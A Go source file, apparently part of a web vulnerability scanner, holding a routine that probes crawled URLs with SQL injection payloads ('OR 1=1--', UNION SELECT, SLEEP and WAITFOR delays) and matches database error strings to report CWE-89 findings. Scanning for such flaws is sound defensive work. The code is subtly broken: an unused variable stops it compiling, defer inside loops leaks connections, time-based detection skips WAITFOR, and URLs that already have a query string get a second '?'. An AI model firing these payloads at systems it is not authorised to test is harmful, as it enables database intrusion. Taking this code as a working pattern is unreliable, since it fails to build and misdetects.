package scanner

import (
    "fmt"
    "io"
    "net/url"
    "strings"
    "time"
    
    "github.com/sin-engine/scanner-service/models"
)

func (e *ScanEngine) testSQLi() {
    params := []string{"id", "user", "page", "product", "category", "item", "article"}
    
    payloads := []string{
        "'",
        "\"",
        "';--",
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' OR '1'='1'--",
        "1' AND '1'='1",
        "1' AND '1'='2",
    }
    
    urls := e.crawlTarget()
    
    for _, targetURL := range urls {
        parsed, err := url.Parse(targetURL)
        if err != nil {
            continue
        }
        
        query := parsed.Query()
        
        for _, param := range params {
            // Test each payload
            for _, payload := range payloads {
                testURL := fmt.Sprintf("%s?%s=%s", targetURL, param, url.QueryEscape(payload))
                
                start := time.Now()
                resp, err := e.client.Get(testURL)
                duration := time.Since(start)
                
                if err != nil {
                    continue
                }
                defer resp.Body.Close()
                
                body, _ := io.ReadAll(resp.Body)
                bodyStr := string(body)
                
                // Check for SQL errors
                sqlErrors := []string{
                    "SQL syntax",
                    "mysql_fetch",
                    "ORA-",
                    "PostgreSQL",
                    "SQLite",
                    "Unclosed quotation mark",
                    "Microsoft OLE DB",
                    "mysqli_fetch",
                    "mysql_error",
                    "pg_query",
                    "SQL command not properly ended",
                }
                
                for _, errMsg := range sqlErrors {
                    if strings.Contains(bodyStr, errMsg) {
                        vuln := models.NewVulnerability()
                        vuln.Type = "SQL Injection"
                        vuln.Severity = models.SeverityCritical
                        vuln.Name = "SQL Injection Vulnerability"
                        vuln.URL = targetURL
                        vuln.Parameter = param
                        vuln.Payload = payload
                        vuln.Evidence = fmt.Sprintf("Error message: %s", errMsg)
                        vuln.Description = "User input is used in database queries without proper sanitization, allowing SQL injection attacks."
                        vuln.Remediation = "Use parameterized queries or prepared statements. Implement proper input validation."
                        vuln.CWE = "CWE-89"
                        vuln.CVSS = 9.0
                        
                        select {
                        case e.vulnChan <- vuln:
                        default:
                        }
                        
                        goto nextParam
                    }
                }
                
                // Time-based detection
                if strings.Contains(payload, "SLEEP") && duration > 5*time.Second {
                    vuln := models.NewVulnerability()
                    vuln.Type = "SQL Injection (Time-based)"
                    vuln.Severity = models.SeverityCritical
                    vuln.Name = "Time-based SQL Injection"
                    vuln.URL = targetURL
                    vuln.Parameter = param
                    vuln.Payload = payload
                    vuln.Evidence = fmt.Sprintf("Response time: %v", duration)
                    vuln.Description = "Time-based SQL injection detected. The application sleeps for 5 seconds when injected with SLEEP(5)."
                    vuln.Remediation = "Use parameterized queries or prepared statements. Implement proper input validation."
                    vuln.CWE = "CWE-89"
                    vuln.CVSS = 8.5
                    
                    select {
                    case e.vulnChan <- vuln:
                    default:
                    }
                    
                    goto nextParam
                }
            }
            nextParam:
        }
    }
}